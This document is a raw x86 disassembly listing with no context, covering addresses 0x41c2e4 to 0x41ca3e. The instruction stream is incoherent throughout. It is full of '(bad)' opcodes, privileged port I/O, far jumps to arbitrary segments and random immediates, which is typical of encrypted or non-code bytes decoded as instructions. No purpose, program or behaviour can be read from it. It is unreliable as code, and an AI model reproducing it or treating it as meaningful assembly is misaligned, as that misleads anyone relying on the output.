  41c2e4:	or     eax,0xf483e08
  41c2e9:	out    0xb1,al
  41c2eb:	sti    
  41c2ec:	push   esp
  41c2ed:	outs   dx,DWORD PTR ds:[esi]
  41c2ee:	pushf  
  41c2ef:	xchg   ebp,eax
  41c2f0:	(bad)  
  41c2f1:	push   edx
  41c2f2:	and    al,0x6c
  41c2f4:	pop    ss
  41c2f5:	or     DWORD PTR [ecx-0x10],ecx
  41c2f8:	sbb    eax,0x3be38937
  41c2fd:	mov    ds:0x7c8dc5c6,al
  41c302:	nop
  41c303:	(bad)  
  41c304:	int3   
  41c305:	jo     0x41c335
  41c307:	xor    bh,dl
  41c309:	inc    esp
  41c30a:	and    DWORD PTR [edi+0x70],ebp
  41c30d:	in     eax,0xef
  41c30f:	cmp    edi,DWORD PTR [edx]
  41c311:	xlat   BYTE PTR ds:[ebx]
  41c313:	js     0x41c321
  41c315:	fwait
  41c316:	cmp    eax,0xf2848868
  41c31b:	xchg   BYTE PTR [esi+0x34],dl
  41c31e:	xchg   edi,eax
  41c31f:	repnz test BYTE PTR [ecx-0x16],cl
  41c323:	dec    eax
  41c324:	adc    DWORD PTR [edx+0x3a],esi
  41c327:	ins    BYTE PTR es:[edi],dx
  41c328:	mov    al,0x1
  41c32a:	popf   
  41c32b:	sub    DWORD PTR [edi],0x4f88dca6
  41c331:	(bad)  
  41c332:	icebp  
  41c333:	mov    ch,BYTE PTR [ecx]
  41c335:	sbb    BYTE PTR [ebx+eiz*4-0x545f61dc],bh
  41c33c:	sbb    ch,dh
  41c33e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c33f:	pusha  
  41c340:	es pop ss
  41c342:	and    BYTE PTR [esi],bh
  41c344:	push   edx
  41c345:	out    0x8a,eax
  41c347:	(bad)
  41c34a:	inc    edx
  41c34b:	pop    edi
  41c34c:	adc    DWORD PTR [ecx+0x58],0xd10aef7c
  41c353:	xor    BYTE PTR [edi],bl
  41c355:	imul   ebx,DWORD PTR [eax-0x7f8264e3],0xe9027ff4
  41c35f:	push   ds
  41c360:	pop    ebp
  41c361:	cld    
  41c362:	sti    
  41c363:	mov    ebx,0x405ff445
  41c368:	adc    DWORD PTR [eax-0x27],ebp
  41c36b:	cmp    ch,ah
  41c36d:	je     0x41c38a
  41c36f:	push   ecx
  41c370:	dec    esp
  41c371:	push   ebp
  41c372:	nop
  41c373:	std    
  41c374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c375:	bound  ebp,QWORD PTR [ecx-0x422bdc86]
  41c37b:	or     bl,BYTE PTR [edx+0x4ffe6ceb]
  41c381:	aad    0xfc
  41c383:	loopne 0x41c3ca
  41c385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c386:	daa    
  41c387:	ds jns 0x41c3ea
  41c38a:	(bad)  
  41c38b:	retf   
  41c38c:	ret    
  41c38d:	into   
  41c38e:	push   ss
  41c38f:	clc    
  41c390:	add    al,0xfc
  41c392:	out    dx,al
  41c393:	xor    al,0xad
  41c395:	sbb    BYTE PTR [ebx],ah
  41c397:	mov    esi,0x37bc6acf
  41c39c:	icebp  
  41c39d:	xor    BYTE PTR [edi-0x3f7064aa],ah
  41c3a3:	ror    BYTE PTR [ecx-0x2a],1
  41c3a6:	adc    al,0x4
  41c3a8:	fisttp DWORD PTR ds:[esi]
  41c3ab:	ins    BYTE PTR es:[edi],dx
  41c3ac:	and    dl,ch
  41c3ae:	loop   0x41c384
  41c3b0:	push   cs
  41c3b1:	mov    cl,0x74
  41c3b3:	in     eax,dx
  41c3b4:	test   al,0x26
  41c3b6:	dec    eax
  41c3b7:	cmp    ecx,DWORD PTR [eax-0x6ab86e13]
  41c3bd:	xchg   dl,bh
  41c3bf:	or     DWORD PTR [ebx],0x3043adce
  41c3c5:	xchg   edx,eax
  41c3c6:	ds out 0xd8,al
  41c3c9:	adc    BYTE PTR [edx+0x63],0x39
  41c3cd:	mov    ch,0x7b
  41c3cf:	jge    0x41c444
  41c3d1:	(bad)  
  41c3d2:	in     eax,dx
  41c3d3:	and    BYTE PTR [eax-0x2be3469a],al
  41c3d9:	mov    eax,0x95319d3c
  41c3de:	pop    ss
  41c3df:	adc    ebp,ebp
  41c3e1:	leave  
  41c3e2:	mov    esi,0xb327ede4
  41c3e7:	shr    DWORD PTR [edi+0xe78ae2e],1
  41c3ed:	push   ebp
  41c3ee:	jg     0x41c3e9
  41c3f0:	cwde   
  41c3f1:	daa    
  41c3f2:	(bad)  
  41c3f3:	in     ax,0x38
  41c3f6:	ins    DWORD PTR es:[edi],dx
  41c3f7:	sub    DWORD PTR [ecx-0x7d],esi
  41c3fa:	cwde   
  41c3fb:	jae    0x41c452
  41c3fd:	and    bh,BYTE PTR [esi+ecx*4-0x2d58b985]
  41c404:	bound  ebx,QWORD PTR [esi+0x26aab430]
  41c40a:	ret    
  41c40b:	ss pop ebp
  41c40d:	(bad)  
  41c40e:	or     al,0x11
  41c410:	ss je  0x41c463
  41c413:	push   ecx
  41c414:	(bad)  
  41c415:	loope  0x41c42f
  41c417:	in     eax,dx
  41c418:	add    eax,0xce0f31c1
  41c41d:	jae    0x41c3b4
  41c41f:	mov    ebx,0x6767f567
  41c424:	ins    DWORD PTR es:[edi],dx
  41c425:	mov    ds:0x643719ac,al
  41c42a:	cmp    eax,ebp
  41c42c:	xor    al,BYTE PTR [ebp+0x22ea5543]
  41c432:	and    al,0xe9
  41c434:	in     al,0x50
  41c436:	(bad)  
  41c437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c438:	in     eax,dx
  41c439:	retf   
  41c43a:	inc    ebx
  41c43b:	mov    ebx,0x16ad014e
  41c440:	mov    fs,WORD PTR ds:0x8628fd6d
  41c446:	mov    ecx,0x522847e6
  41c44b:	ja     0x41c3d5
  41c44d:	(bad)  
  41c44e:	fptan  
  41c450:	test   al,0x1e
  41c452:	out    dx,al
  41c453:	jge    0x41c41b
  41c455:	retf   
  41c456:	pop    ebp
  41c457:	xchg   esp,eax
  41c458:	add    eax,0xb1e06859
  41c45d:	dec    edi
  41c45e:	lock add ebx,esi
  41c461:	repz loop 0x41c46d
  41c464:	mov    bl,0x1c
  41c466:	pusha  
  41c467:	scas   al,BYTE PTR es:[edi]
  41c468:	lahf   
  41c469:	jl     0x41c4ea
  41c46b:	daa    
  41c46c:	popa   
  41c46d:	xor    edi,eax
  41c46f:	pop    edx
  41c470:	into   
  41c471:	jns    0x41c431
  41c473:	into   
  41c474:	dec    edx
  41c475:	mov    DWORD PTR [esi+0xf071390],esi
  41c47b:	dec    esp
  41c47c:	push   eax
  41c47d:	push   ds
  41c47e:	xchg   ebx,eax
  41c47f:	imul   esi,DWORD PTR [eax+0x7af1c77c],0xffffffad
  41c486:	lods   al,BYTE PTR ds:[esi]
  41c487:	xchg   edi,eax
  41c488:	xchg   ch,bl
  41c48a:	xor    eax,0xbcc26875
  41c48f:	sahf   
  41c490:	jge    0x41c438
  41c492:	test   eax,0x509acbfd
  41c497:	lea    esp,[esi]
  41c499:	xor    esi,DWORD PTR [ecx]
  41c49b:	repnz fld DWORD PTR [ecx+0x3d9a4bd6]
  41c4a2:	aas    
  41c4a3:	leave  
  41c4a4:	push   ds
  41c4a5:	stos   DWORD PTR es:[edi],eax
  41c4a6:	mov    ch,0x33
  41c4a8:	sbb    eax,0x8138259d
  41c4ad:	mov    ds:0x59143322,al
  41c4b2:	(bad)  
  41c4b3:	cmp    BYTE PTR [eax+0x524257c0],dh
  41c4b9:	loop   0x41c44a
  41c4bb:	or     eax,0x31336c3f
  41c4c0:	mov    ebx,0x92646215
  41c4c5:	mov    edi,0xffbf14a2
  41c4ca:	dec    esp
  41c4cb:	popa   
  41c4cc:	shl    ebx,cl
  41c4ce:	and    eax,0xe35949d9
  41c4d3:	mov    ecx,DWORD PTR [ecx]
  41c4d5:	imul   esp,DWORD PTR [esi+0x6],0xe94a3402
  41c4dc:	sbb    BYTE PTR [edi-0x202020e0],ah
  41c4e2:	fcom   DWORD PTR [ebx-0x1163b53c]
  41c4e8:	hlt    
  41c4e9:	mov    cl,0x9
  41c4eb:	daa    
  41c4ec:	xlat   BYTE PTR ds:[ebx]
  41c4ed:	repnz inc ebx
  41c4ef:	sub    BYTE PTR [edx+ecx*4],bh
  41c4f2:	cdq    
  41c4f3:	std    
  41c4f4:	(bad)  
  41c4f6:	mov    eax,ds:0x548e99d0
  41c4fb:	lds    ecx,FWORD PTR [eax-0x6b]
  41c4fe:	call   0x7862:0x18efd89
  41c505:	jp     0x41c51f
  41c507:	dec    edi
  41c508:	cs cld 
  41c50a:	sbb    BYTE PTR [eax+eax*4+0x6e],bl
  41c50e:	fist   WORD PTR [ecx+0x24]
  41c511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c512:	mov    ah,0x15
  41c514:	cwde   
  41c515:	loopne 0x41c524
  41c517:	retf   
  41c518:	cmp    ch,bh
  41c51a:	xchg   edi,eax
  41c51b:	mov    al,ds:0x6a864e07
  41c520:	mov    edi,DWORD PTR [esp+ebp*1-0x6f]
  41c524:	mov    edx,0xe97ba6b2
  41c529:	mov    bl,0xaa
  41c52b:	in     eax,0xdf
  41c52d:	psubsw mm2,QWORD PTR gs:[eax]
  41c531:	(bad)  
  41c532:	mov    dl,bl
  41c534:	sub    eax,0xe028e439
  41c539:	sbb    BYTE PTR [ebp+0x68],ah
  41c53c:	mov    bl,BYTE PTR [esi-0x75]
  41c53f:	fmul   QWORD PTR [eax+esi*1+0x71e85c8c]
  41c546:	jae    0x41c561
  41c548:	xchg   esi,eax
  41c549:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c54a:	cmp    DWORD PTR [edx+0x58],eax
  41c54d:	xor    ah,BYTE PTR [esi-0x55]
  41c550:	les    edi,FWORD PTR [edx]
  41c552:	stc    
  41c553:	fdivr  DWORD PTR [ebx-0x31]
  41c556:	mov    dh,0x52
  41c558:	or     DWORD PTR [eax+0x1e],ebp
  41c55b:	pop    esp
  41c55c:	idiv   dl
  41c55e:	mov    esp,0x8ea567e
  41c563:	mov    BYTE PTR [edi-0x74],bh
  41c566:	sar    DWORD PTR [eax],0x68
  41c569:	popa   
  41c56a:	lds    eax,FWORD PTR [ecx+esi*4]
  41c56d:	xchg   edi,eax
  41c56e:	fcomp  st(1)
  41c570:	rcl    BYTE PTR [eax+0x68],1
  41c573:	xchg   ecx,eax
  41c574:	cmp    esi,esi
  41c576:	mov    ecx,0xb488fa1c
  41c57b:	cmp    al,0xd6
  41c57d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c57e:	jmp    0x41c581
  41c580:	scas   al,BYTE PTR es:[edi]
  41c581:	imul   eax,DWORD PTR [ecx],0x3
  41c584:	push   edi
  41c585:	mov    cs,esi
  41c587:	or     BYTE PTR ds:0xcb5732a8,al
  41c58d:	xor    bl,ah
  41c58f:	scas   al,BYTE PTR es:[edi]
  41c590:	mov    bl,0xb5
  41c592:	adc    ch,0x84
  41c595:	push   esi
  41c596:	mov    ah,0x1e
  41c598:	into   
  41c599:	jb     0x41c61a
  41c59b:	mov    ebp,0xa7b246ba
  41c5a0:	retf   
  41c5a1:	add    DWORD PTR [eax],ebp
  41c5a3:	je     0x41c5e9
  41c5a5:	(bad)  [ebx]
  41c5a7:	icebp  
  41c5a8:	cdq    
  41c5a9:	js     0x41c5b6
  41c5ab:	sbb    ebp,eax
  41c5ad:	cmp    ecx,DWORD PTR [esi+0x11]
  41c5b0:	loope  0x41c57e
  41c5b2:	int3   
  41c5b3:	sub    esi,edx
  41c5b5:	push   cs
  41c5b6:	mov    ebp,0xe01a048d
  41c5bb:	scas   al,BYTE PTR es:[edi]
  41c5bc:	push   ecx
  41c5bd:	adc    DWORD PTR [ebp+0x1c],eax
  41c5c0:	pop    edi
  41c5c1:	out    0x96,al
  41c5c3:	push   es
  41c5c4:	in     eax,dx
  41c5c5:	mov    ecx,0xa17a9526
  41c5ca:	or     ebp,DWORD PTR [eax]
  41c5cc:	mov    ds:0xfb585974,eax
  41c5d1:	sbb    ch,al
  41c5d3:	or     BYTE PTR [eax-0x7b],bl
  41c5d6:	pop    ds
  41c5d7:	jno    0x41c56d
  41c5d9:	loope  0x41c58c
  41c5db:	adc    al,0x7a
  41c5dd:	daa    
  41c5de:	arpl   WORD PTR [ebx+ebx*8],si
  41c5e1:	loope  0x41c56f
  41c5e3:	test   DWORD PTR [edi-0x67],edi
  41c5e6:	push   cs
  41c5e7:	call   0xf3a8:0x44fc9387
  41c5ee:	pop    ecx
  41c5ef:	sbb    bl,dl
  41c5f1:	cmp    BYTE PTR [esp+edx*8+0xfba910e],bh
  41c5f8:	out    dx,eax
  41c5f9:	push   es
  41c5fa:	fs dec esp
  41c5fc:	jbe    0x41c5e7
  41c5fe:	jge    0x41c66b
  41c600:	or     al,0xda
  41c602:	cld    
  41c603:	out    dx,eax
  41c604:	cld    
  41c605:	mov    ch,0xce
  41c607:	out    dx,al
  41c608:	imul   esp,DWORD PTR [ebx+0x664a038e],0x7f
  41c60f:	xchg   edx,eax
  41c610:	adc    ah,BYTE PTR [edi-0x28adcf4a]
  41c616:	xchg   ebp,eax
  41c617:	cmp    dl,BYTE PTR [ebp+0x7f3d8181]
  41c61d:	std    
  41c61e:	stos   BYTE PTR es:[edi],al
  41c61f:	add    bl,0x5d
  41c622:	cdq    
  41c623:	mov    ah,0x76
  41c625:	lea    edi,[ecx]
  41c627:	(bad)  
  41c629:	inc    eax
  41c62a:	push   ebx
  41c62b:	lock inc edi
  41c62d:	into   
  41c62e:	sub    al,0x69
  41c631:	dec    ebx
  41c632:	stc    
  41c633:	and    DWORD PTR [esi+0x52220631],esi
  41c639:	popa   
  41c63a:	pop    esi
  41c63b:	and    esp,DWORD PTR es:[edx-0x5408b9f3]
  41c642:	mov    esi,0x95b5a37f
  41c647:	rcl    BYTE PTR [ebx-0x46],1
  41c64a:	out    0xe2,al
  41c64c:	std    
  41c64d:	es xchg edi,eax
  41c64f:	jne    0x41c609
  41c651:	fnstenv [edx-0x5b9153da]
  41c657:	xchg   esp,eax
  41c658:	xor    bh,dl
  41c65a:	mov    ?,WORD PTR [eax]
  41c65c:	outs   dx,BYTE PTR ds:[esi]
  41c65d:	or     al,0x69
  41c65f:	lods   ax,WORD PTR ds:[esi]
  41c661:	mov    esp,0x908c133d
  41c666:	push   esi
  41c667:	adc    al,0xa2
  41c669:	ja     0x41c5f1
  41c66b:	sub    ebp,DWORD PTR [ecx+ebp*1+0x29]
  41c66f:	jp     0x41c670
  41c671:	push   0xffffff90
  41c673:	push   ebx
  41c674:	cmp    BYTE PTR [esi-0x3e],ah
  41c677:	lods   eax,DWORD PTR ds:[esi]
  41c678:	pop    ebx
  41c679:	push   ecx
  41c67a:	mov    esi,0x2fca3607
  41c67f:	lea    eax,[eax-0x4994d998]
  41c685:	es out 0xc1,al
  41c688:	pop    edx
  41c689:	iret   
  41c68a:	mov    esi,0x1204c748
  41c68f:	or     ecx,ebp
  41c691:	arpl   WORD PTR [edx-0x235192ae],bx
  41c697:	stos   BYTE PTR es:[edi],al
  41c698:	mov    al,ds:0xbe3492dd
  41c69d:	xor    edi,0x5b
  41c6a0:	xchg   ecx,eax
  41c6a1:	test   DWORD PTR [esi+0x3241f7e7],0xb19237a1
  41c6ab:	cmp    bh,al
  41c6ad:	and    eax,0x34ced36d
  41c6b2:	retf   
  41c6b3:	scas   al,BYTE PTR es:[edi]
  41c6b4:	cmp    edx,DWORD PTR [esi]
  41c6b6:	jge    0x41c6bd
  41c6b8:	mov    al,ds:0xacdb6cd8
  41c6bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6be:	mov    cl,0x52
  41c6c0:	mov    cl,0x9e
  41c6c2:	jbe    0x41c647
  41c6c4:	call   0x524a:0x9b4265c3
  41c6cb:	not    ch
  41c6cd:	out    0xf5,eax
  41c6cf:	jno    0x41c6ff
  41c6d1:	sar    DWORD PTR [esi-0x71],1
  41c6d4:	or     DWORD PTR [ecx],eax
  41c6d6:	mov    ecx,0x48102fb6
  41c6db:	mov    BYTE PTR ds:0x8fc9e3df,ch
  41c6e1:	add    BYTE PTR [edx],cl
  41c6e3:	mov    dl,0xa3
  41c6e5:	mov    WORD PTR [ebp-0x313e743a],fs
  41c6eb:	test   BYTE PTR [eax-0x49],bh
  41c6ee:	cwde   
  41c6ef:	pop    eax
  41c6f0:	test   dl,ah
  41c6f2:	fsubr  st(6),st
  41c6f4:	xchg   ecx,eax
  41c6f5:	push   ebp
  41c6f6:	mov    al,ds:0x42200ef2
  41c6fb:	xor    BYTE PTR [edx+esi*8-0x19],0x58
  41c700:	pushf  
  41c701:	push   ebx
  41c702:	jl     0x41c77c
  41c704:	sbb    bh,BYTE PTR [edx-0x65e3dc76]
  41c70a:	scas   al,BYTE PTR es:[edi]
  41c70b:	sbb    DWORD PTR [ecx],esi
  41c70d:	mov    ecx,esp
  41c70f:	dec    ebp
  41c710:	jle    0x41c694
  41c712:	mov    edi,0xb8dfb626
  41c717:	repnz and BYTE PTR cs:[ebp+0x3afea234],ah
  41c71f:	aas    
  41c720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c721:	and    BYTE PTR [edi],ah
  41c723:	das    
  41c724:	test   ch,bh
  41c726:	xor    edi,edi
  41c728:	call   0x2597:0x7f1c850a
  41c72f:	jl     0x41c70e
  41c731:	push   ss
  41c732:	cmp    DWORD PTR [eax-0x6f47d03d],ebp
  41c738:	es pop esi
  41c73a:	(bad)  
  41c73b:	lock pop ds
  41c73d:	mov    al,ds:0x40704b3d
  41c742:	push   ss
  41c743:	cs jg  0x41c778
  41c746:	mov    ch,0x83
  41c748:	stos   BYTE PTR es:[edi],al
  41c749:	xchg   edx,eax
  41c74a:	fadd   DWORD PTR [ecx-0x42]
  41c74d:	lea    ebp,[eax+esi*8-0x5a2a28fc]
  41c754:	xchg   BYTE PTR [ebp-0x1f623f84],ch
  41c75a:	mov    edi,DWORD PTR [edi-0x745d38a5]
  41c760:	and    BYTE PTR [esi],ch
  41c762:	and    edx,DWORD PTR [edx+0x4e4ab5f2]
  41c768:	inc    edi
  41c769:	mov    dl,0x38
  41c76b:	adc    BYTE PTR [esi-0x884a374],al
  41c771:	in     eax,0xf0
  41c773:	ret    
  41c774:	adc    esp,DWORD PTR [ebx+ecx*8-0x1a89695a]
  41c77b:	inc    esi
  41c77c:	repnz and ebp,ebp
  41c77f:	cmp    bh,BYTE PTR [ecx+edi*4-0x419531ae]
  41c786:	fistp  WORD PTR [ebx]
  41c788:	or     eax,0xefe800c8
  41c78d:	and    ebp,DWORD PTR [ecx]
  41c78f:	addr16 pop esi
  41c791:	in     eax,dx
  41c792:	ja     0x41c71a
  41c794:	loope  0x41c7a2
  41c796:	jno    0x41c789
  41c798:	mov    ah,0xc3
  41c79a:	and    DWORD PTR [ecx-0xf87d8a4],ebp
  41c7a0:	call   0xfe02013
  41c7a5:	push   ecx
  41c7a6:	in     al,0x27
  41c7a8:	xchg   DWORD PTR [eax-0x77],ebx
  41c7ab:	push   ebx
  41c7ac:	xchg   esi,eax
  41c7ad:	xchg   ecx,ecx
  41c7af:	imul   edx,DWORD PTR [esi-0x1b],0xb13cee5c
  41c7b6:	cli    
  41c7b7:	mov    eax,0xbbe2e304
  41c7bc:	sub    BYTE PTR [eax+0x16],al
  41c7bf:	xor    al,0x75
  41c7c1:	repz dec ebp
  41c7c3:	jne    0x41c7c8
  41c7c5:	and    al,bl
  41c7c7:	imul   ecx,DWORD PTR [eax+edi*8-0x42],0x34
  41c7cc:	pushf  
  41c7cd:	hlt    
  41c7ce:	mov    WORD PTR [ebx+0x5d6cea6d],ss
  41c7d4:	gs mov ebp,0x2a52182a
  41c7da:	(bad)  
  41c7db:	sub    edx,DWORD PTR [ecx+ebx*2+0x4ac665e]
  41c7e2:	adc    al,0x31
  41c7e4:	jnp    0x41c791
  41c7e6:	sub    eax,0x478c5f40
  41c7eb:	push   edi
  41c7ec:	push   0x9e5ed2b5
  41c7f1:	mov    ebp,0x5df7b39e
  41c7f6:	loop   0x41c7f8
  41c7f8:	mov    WORD PTR [edi+eiz*2+0x478c570d],ds
  41c7ff:	adc    ch,0x42
  41c802:	cwde   
  41c803:	inc    eax
  41c804:	js     0x41c81d
  41c806:	fistp  WORD PTR [edi]
  41c808:	or     eax,0xa2c0d79e
  41c80d:	clc    
  41c80e:	stos   DWORD PTR es:[edi],eax
  41c80f:	sbb    cl,bl
  41c811:	stos   DWORD PTR es:[edi],eax
  41c812:	popa   
  41c813:	mov    bl,0x16
  41c815:	adc    eax,0x864a91c0
  41c81a:	inc    edx
  41c81b:	pop    ebp
  41c81c:	mov    ds:0x6d5dc6e8,al
  41c821:	test   al,0x41
  41c823:	and    BYTE PTR [edi],ch
  41c825:	push   ds
  41c826:	dec    esi
  41c827:	mov    esi,0xc2588e3
  41c82c:	push   esp
  41c82d:	inc    DWORD PTR [esi]
  41c82f:	mov    BYTE PTR [edi],bl
  41c831:	lea    ecx,[edx+0x63a93cc9]
  41c837:	pop    ds
  41c838:	mov    bh,bh
  41c83a:	jg     0x41c7bd
  41c83c:	inc    ebx
  41c83d:	(bad)  
  41c83e:	nop
  41c83f:	loopne 0x41c800
  41c841:	pop    eax
  41c842:	push   ds
  41c843:	add    DWORD PTR [esi+eiz*4+0x480e73db],ecx
  41c84a:	add    eax,0x2510c755
  41c84f:	fld    DWORD PTR [ebp+0x18af5670]
  41c855:	fsub   QWORD PTR [esi-0x2d]
  41c858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c859:	ja     0x41c7e0
  41c85b:	pop    es
  41c85c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c85d:	xlat   BYTE PTR ds:[ebx]
  41c85e:	je     0x41c834
  41c860:	and    BYTE PTR [edi-0x51],dl
  41c863:	pop    edi
  41c864:	adc    ebp,DWORD PTR [ecx-0x30]
  41c867:	and    BYTE PTR [ebx-0x65],al
  41c86a:	ds inc ecx
  41c86c:	and    BYTE PTR [esi+eax*2],ah
  41c86f:	jb     0x41c837
  41c871:	bound  ebx,QWORD PTR [esp+ebx*4-0x26]
  41c875:	sub    bl,0x10
  41c878:	sti    
  41c879:	adc    eax,0x2d13aca7
  41c87e:	arpl   WORD PTR [ebp+ebp*2-0x13],cx
  41c882:	jo     0x41c853
  41c884:	popa   
  41c885:	adc    bl,BYTE PTR [edx+0x15]
  41c888:	ret    0x93d8
  41c88b:	pop    ss
  41c88c:	mov    cl,0x1d
  41c88e:	jb     0x41c8cf
  41c890:	retf   
  41c891:	(bad)  
  41c892:	outs   dx,DWORD PTR ds:[esi]
  41c893:	pop    ds
  41c894:	pop    eax
  41c895:	aas    
  41c896:	mov    esi,esi
  41c898:	jmp    0x8ee4:0x576ef3ce
  41c89f:	test   al,0x1
  41c8a1:	outs   dx,DWORD PTR ds:[esi]
  41c8a2:	inc    ebp
  41c8a3:	imul   esi,DWORD PTR [esi+0x3b724443],0xee6eb63c
  41c8ad:	fldpi  
  41c8af:	sahf   
  41c8b0:	push   ds
  41c8b1:	dec    edi
  41c8b2:	inc    eax
  41c8b3:	shl    eax,0xf0
  41c8b6:	lahf   
  41c8b7:	pop    esp
  41c8b8:	int3   
  41c8b9:	sbb    al,0x8e
  41c8bb:	dec    esi
  41c8bc:	dec    edi
  41c8bd:	js     0x41c8d3
  41c8bf:	push   ebp
  41c8c0:	sti    
  41c8c1:	outs   dx,DWORD PTR ds:[esi]
  41c8c2:	shl    DWORD PTR [edx+edi*1-0x5f],cl
  41c8c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8c7:	mov    bl,0xc4
  41c8c9:	in     al,dx
  41c8ca:	xor    DWORD PTR [ebx+0x64],edi
  41c8cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8ce:	into   
  41c8cf:	pop    esp
  41c8d0:	push   ebp
  41c8d1:	and    BYTE PTR [eax-0x39d79e3d],ch
  41c8d7:	loop   0x41c902
  41c8d9:	mov    ebx,0x2c466faf
  41c8de:	jo     0x41c898
  41c8e0:	adc    al,0x48
  41c8e2:	xchg   esp,eax
  41c8e3:	div    BYTE PTR [esi]
  41c8e5:	push   0xa49aad5c
  41c8ea:	lock cmc 
  41c8ec:	shl    ebp,cl
  41c8ee:	inc    edx
  41c8ef:	jne    0x41c897
  41c8f1:	aas    
  41c8f2:	adc    edx,DWORD PTR [esi-0x5de15c94]
  41c8f8:	pushf  
  41c8f9:	sbb    eax,0x65dd28e7
  41c8fe:	pop    ss
  41c8ff:	iret   
  41c900:	cmp    eax,0xbefccd9e
  41c905:	push   0x677a3326
  41c90a:	xor    ebp,DWORD PTR [ecx]
  41c90c:	mov    ebp,edx
  41c90e:	int    0xdf
  41c910:	cmp    eax,0xaa93cce4
  41c915:	repz loop 0x41c92c
  41c918:	fmulp  st(7),st
  41c91a:	add    eax,0xac34ba35
  41c91f:	mov    ch,BYTE PTR [ebp+0x2039ed13]
  41c925:	xchg   edx,eax
  41c926:	aas    
  41c927:	sbb    al,0x84
  41c929:	outs   dx,BYTE PTR ds:[esi]
  41c92a:	add    cl,BYTE PTR [edi-0x6891c5c0]
  41c930:	jl     0x41c991
  41c932:	sar    DWORD PTR [edi-0x1b],1
  41c935:	cmp    bh,cl
  41c937:	(bad)
  41c93a:	mov    ds:0x347e460d,al
  41c93f:	in     eax,0x35
  41c941:	mov    ds:0x60beb809,eax
  41c946:	pop    ecx
  41c947:	sub    eax,0x8e9483ea
  41c94c:	xchg   ebp,eax
  41c94d:	stos   BYTE PTR es:[edi],al
  41c94e:	imul   eax,DWORD PTR [edi+0xf],0x9af348a6
  41c955:	jmp    0xb7ed68ce
  41c95a:	xor    dl,BYTE PTR [esp+ebp*8]
  41c95d:	pop    es
  41c95e:	cmp    eax,0xfbc53b9a
  41c963:	iret   
  41c964:	cli    
  41c965:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c966:	cmp    BYTE PTR [di],ah
  41c969:	sahf   
  41c96a:	cwde   
  41c96b:	inc    ebx
  41c96c:	subps  xmm1,XMMWORD PTR [esi-0x1e]
  41c970:	aaa    
  41c971:	jae    0x41c99e
  41c973:	pop    edx
  41c974:	xor    DWORD PTR ds:[edx],ebp
  41c977:	daa    
  41c978:	cmp    BYTE PTR [ebp-0x64],0x27
  41c97c:	cmc    
  41c97d:	mov    eax,0x24efebc4
  41c982:	pop    ss
  41c983:	lods   eax,DWORD PTR ds:[esi]
  41c984:	push   es
  41c985:	xor    esi,ebx
  41c987:	add    ecx,DWORD PTR [edi]
  41c989:	push   esi
  41c98a:	dec    esi
  41c98b:	mov    eax,ebx
  41c98d:	sahf   
  41c98e:	in     eax,0x6d
  41c990:	scas   eax,DWORD PTR es:[edi]
  41c991:	dec    esi
  41c992:	adc    bh,BYTE PTR [eax+ecx*8]
  41c995:	lods   al,BYTE PTR ds:[esi]
  41c996:	rcl    BYTE PTR [ebp-0x4844f592],0x8b
  41c99d:	inc    edi
  41c99e:	fs jne 0x41c976
  41c9a1:	pusha  
  41c9a2:	je     0x41c980
  41c9a4:	int3   
  41c9a5:	lods   al,BYTE PTR ds:[esi]
  41c9a6:	mov    bl,0xbd
  41c9a8:	mov    bh,0xb3
  41c9aa:	test   BYTE PTR [esi+0x70],cl
  41c9ad:	rol    BYTE PTR ds:0xc81428ff,cl
  41c9b3:	jecxz  0x41c9e5
  41c9b5:	inc    ebp
  41c9b6:	idiv   ebp
  41c9b8:	ret    0x70bf
  41c9bb:	dec    esp
  41c9bc:	lahf   
  41c9bd:	sub    eax,0x7ff1e6ee
  41c9c2:	fs into 
  41c9c4:	out    dx,al
  41c9c5:	and    ah,dl
  41c9c7:	lahf   
  41c9c8:	jbe    0x41ca1b
  41c9ca:	xchg   ebx,eax
  41c9cb:	(bad)  
  41c9cc:	cmp    edx,DWORD PTR [ebx+ebp*2]
  41c9cf:	pop    ss
  41c9d0:	in     al,0xf2
  41c9d2:	cmp    eax,0x6ee2d972
  41c9d7:	(bad)  
  41c9d8:	jae    0x41ca44
  41c9da:	out    0x9c,eax
  41c9dc:	jb     0x41c9b9
  41c9de:	sub    eax,0x22a7617a
  41c9e3:	sbb    cl,BYTE PTR [edx+0xf]
  41c9e6:	add    edi,ebp
  41c9e8:	jno    0x41c985
  41c9ea:	jle    0x41c9f5
  41c9ec:	sub    eax,0x9a949ad
  41c9f1:	mov    al,ds:0xc00ea0a7
  41c9f6:	test   DWORD PTR [esi],ebx
  41c9f8:	and    al,0xf6
  41c9fa:	and    eax,0xa8f999ad
  41c9ff:	mov    esi,ecx
  41ca01:	ror    DWORD PTR [ecx-0x31c36b4],1
  41ca07:	stos   BYTE PTR es:[edi],al
  41ca08:	cld    
  41ca09:	jae    0x41c9e6
  41ca0b:	or     BYTE PTR [edx+0x6d],0x83
  41ca0f:	jge    0x41c9ea
  41ca11:	imul   ebp,edx,0xab36a6ed
  41ca17:	jmp    0x41ca34
  41ca19:	pop    ds
  41ca1a:	jmp    0x41ca1d
  41ca1c:	xor    BYTE PTR [eax-0x1740124e],al
  41ca22:	cmp    bh,ah
  41ca24:	push   ebx
  41ca25:	push   cs
  41ca26:	push   cs
  41ca27:	sbb    cl,BYTE PTR [eax+ebx*1-0x27]
  41ca2b:	mov    es,esi
  41ca2d:	add    BYTE PTR [eax],cl
  41ca2f:	or     eax,DWORD PTR [ecx]
  41ca31:	ins    DWORD PTR es:[edi],dx
  41ca32:	scas   al,BYTE PTR es:[edi]
  41ca33:	lfs    ecx,FWORD PTR [ebx-0x17b6c85a]
  41ca3a:	cdq    
  41ca3b:	sar    edi,0xd1
  41ca3e:	jmp    0x93b2c881
